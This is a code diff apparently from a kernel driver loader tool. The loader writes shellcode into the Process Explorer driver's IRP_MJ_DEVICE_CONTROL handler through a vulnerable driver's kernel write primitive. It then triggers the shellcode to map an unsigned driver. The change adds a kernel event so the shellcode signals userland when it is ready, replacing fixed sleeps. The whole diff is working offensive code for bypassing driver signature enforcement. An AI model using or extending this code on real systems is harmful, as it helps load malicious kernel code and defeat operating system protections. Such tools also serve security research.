@@ -23,19 +23,20 @@
 // WARNING: shellcode DOESN'T WORK in DEBUG
 //
 
-#define BOOTSTRAPCODE_SIZE 1968 //correct this value if Import change it size
+#define BOOTSTRAPCODE_SIZE 1944 //correct this value if Import change it size
 
 //
 // Size in bytes
 // InitCode         16
-// Import           64
-// BootstrapCode    1968
+// Import           88
+// BootstrapCode    1944
 //
 
 //sizeof 2048
 typedef struct _SHELLCODE {
     BYTE InitCode[16];
     BYTE BootstrapCode[BOOTSTRAPCODE_SIZE];
+    HANDLE ReadyEventHandle;
     FUNC_TABLE Import;
 } SHELLCODE, * PSHELLCODE;
 
@@ -219,6 +220,8 @@ NTSTATUS NTAPI FakeDispatchRoutine(
 
     USHORT                          cbValueKey = sizeof(szValueKey) - sizeof(WCHAR);
 
+    PKEVENT                         ReadyEvent;
+
     UNREFERENCED_PARAMETER(DeviceObject);
 
 #ifdef _DEBUG
@@ -319,6 +322,17 @@ NTSTATUS NTAPI FakeDispatchRoutine(
                                 (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL)))
                             {
                                 ShellCode->Import.ZwClose(hThread);
+                            }
+
+                            //
+                            // Fire the event to let userland know that we're ready
+                            //
+                            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
+                                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
+                            if (NT_SUCCESS(status))
+                            {
+                                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
+                                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
                             }
 
                             DeviceObject->SectorSize = 512;
@@ -569,6 +583,18 @@ BOOL KDUSetupShellCode(
             (pfnZwDeleteValueKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwDeleteValueKey");
         ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwDeleteValueKey);
 
+        g_ShellCode->Import.ObReferenceObjectByHandle =
+            (pfnObReferenceObjectByHandle)KDUResolveFunctionInternal(KernelBase, KernelImage, "ObReferenceObjectByHandle");
+        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ObReferenceObjectByHandle);
+
+        g_ShellCode->Import.ObfDereferenceObject =
+            (pfnObfDereferenceObject)KDUResolveFunctionInternal(KernelBase, KernelImage, "ObfDereferenceObject");
+        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ObfDereferenceObject);
+
+        g_ShellCode->Import.KeSetEvent =
+            (pfnKeSetEvent)KDUResolveFunctionInternal(KernelBase, KernelImage, "KeSetEvent");
+        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.KeSetEvent);
+
         /*g_ShellCode->Import.DbgPrint =
             (pfnDbgPrint)KDUResolveFunctionInternal(KernelBase, KernelImage, "DbgPrint");
         ASSERT_RESOLVED_FUNC(g_ShellCode->Import.DbgPrint);*/
@@ -800,27 +826,41 @@ Reload:
 
         if (KDUSetupShellCode(Context, lpMapDriverFileName)) {
 
-            //
-            // Write shellcode to driver.
-            //
-            if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
-                targetAddress,
-                g_ShellCode, sizeof(SHELLCODE)))
-            {
-                printf_s("[!] Error writing shellcode to the target driver, abort\r\n");
+            HANDLE readyEventHandle = CreateEventW(NULL, TRUE, FALSE, NULL);
+            if (readyEventHandle) {
+
+                g_ShellCode->ReadyEventHandle = readyEventHandle;
+
+                //
+                // Write shellcode to driver.
+                //
+                if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
+                    targetAddress,
+                    g_ShellCode, sizeof(SHELLCODE)))
+                {
+                    printf_s("[!] Error writing shellcode to the target driver, abort\r\n");
+                }
+                else {
+
+                    printf_s("[+] Driver IRP_MJ_DEVICE_CONTROL handler code modified\r\n");
+
+                    //
+                    // Run shellcode.
+                    // Target has the same handlers for IRP_MJ_CREATE/CLOSE/DEVICE_CONTROL
+                    //
+                    printf_s("[+] Run shellcode\r\n");
+                    supOpenDriver((LPWSTR)PROCEXP152, GENERIC_READ | GENERIC_WRITE, &victimDeviceHandle);
+
+                    //
+                    // Wait for the shellcode to trigger the event
+                    //
+                    if (WaitForSingleObject(readyEventHandle, 2000) != WAIT_OBJECT_0) {
+                        printf_s("[!] Shellcode did not trigger the event within two seconds.\r\n");
+                    }
+                }
             }
             else {
-
-                printf_s("[+] Driver IRP_MJ_DEVICE_CONTROL handler code modified\r\n");
-
-                //
-                // Run shellcode.
-                // Target has the same handlers for IRP_MJ_CREATE/CLOSE/DEVICE_CONTROL
-                //
-                printf_s("[+] Run shellcode\r\n");
-                Sleep(1000);
-                supOpenDriver((LPWSTR)PROCEXP152, GENERIC_READ| GENERIC_WRITE, &victimDeviceHandle);
-                Sleep(1000);
+                printf_s("[!] Error building the ready event handle, abort\r\n");
             }
         }
         else {
